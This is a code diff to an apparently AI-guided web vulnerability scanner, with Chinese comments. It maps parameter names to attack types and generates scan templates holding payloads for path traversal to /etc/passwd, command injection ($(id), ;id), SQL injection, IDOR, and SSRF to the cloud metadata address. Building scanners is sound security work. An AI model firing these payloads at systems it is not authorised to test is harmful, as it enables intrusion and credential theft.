@@ -140,6 +140,30 @@ def run_ai_guided(executor, target: str, depth: str = "standard", **kwargs) -> D
         top_params = [p.get("param") for p in prio[:3]]  # AI 决策点：取 top3
         _stage("prioritize", True, f"Top 参数: {top_params}")
 
+        # Stage 2.5: 知识库注入——按参数类型查渗透经验，打开 AI 攻击思路
+        kb_hints = []
+        kb_context = {}  # param → 知识库摘要
+        for p in top_params:
+            pl = str(p).lower()
+            kb_query = None
+            if any(k in pl for k in ("id", "uid", "user", "account", "profile")):
+                kb_query = "越权"
+            elif any(k in pl for k in ("file", "path", "download", "read")):
+                kb_query = "文件读取"
+            elif any(k in pl for k in ("cmd", "exec", "shell", "ping", "host")):
+                kb_query = "命令执行"
+            elif any(k in pl for k in ("search", "q", "query", "keyword")):
+                kb_query = "SQL注入"
+            elif any(k in pl for k in ("url", "link", "redirect", "next")):
+                kb_query = "SSRF"
+            if kb_query:
+                kb_r = _run([FASTSEC_BIN, "-kb", kb_query])
+                kb_out = (kb_r.get("output") or "")[:500]
+                kb_context[p] = {"query": kb_query, "hint": kb_out[:200]}
+                kb_hints.append(f"{p}→{kb_query}")
+        if kb_hints:
+            _stage("knowledge", True, f"知识库注入: {kb_hints}")
+
         # Stage 3-4: 生成针对性模板（纯 python 生成 YAML）+ 经 ssh 写 Kali 临时目录 + fastsec 深挖
         if top_params:
             # 找每个 top 参数的发现 URL（去 query，取路径）
@@ -152,9 +176,24 @@ def run_ai_guided(executor, target: str, depth: str = "standard", **kwargs) -> D
                 f_url = url_map.get(pname, str(target))
                 base_path = urlparse(f_url.split("?")[0]).path or "/"
                 sev = next((pp.get("severity", "medium") for pp in prio if pp.get("param") == pname), "medium")
+                # 知识库驱动的 payload 选择：按注入类型用攻击值
+                ctx = kb_context.get(pname, {})
+                kb_query = ctx.get("query", "")
+                if kb_query == "文件读取":
+                    values = ("../../../../etc/passwd", "..%2f..%2fetc%2fpasswd", "/etc/passwd", "....//....//etc/passwd")
+                elif kb_query == "命令执行":
+                    values = (";id", "|id", "$(id)", "`id`")
+                elif kb_query == "SQL注入":
+                    values = ("'", "1' OR '1'='1", "1 UNION SELECT 1,2-- -", "1 AND 1=1")
+                elif kb_query == "越权":
+                    values = ("2", "0", "-1", "999999")
+                elif kb_query == "SSRF":
+                    values = ("http://127.0.0.1", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd", "http://0.0.0.0")
+                else:
+                    values = ("2", "0", "-1", "999999")
                 paths = "\n".join(
                     f'      - "{{{{BaseURL}}}}{base_path}?{pname}={v}"'
-                    for v in ("2", "0", "-1", "999999")
+                    for v in values
                 )
                 tpl = (
                     f"id: diff-{pname}\n\n"
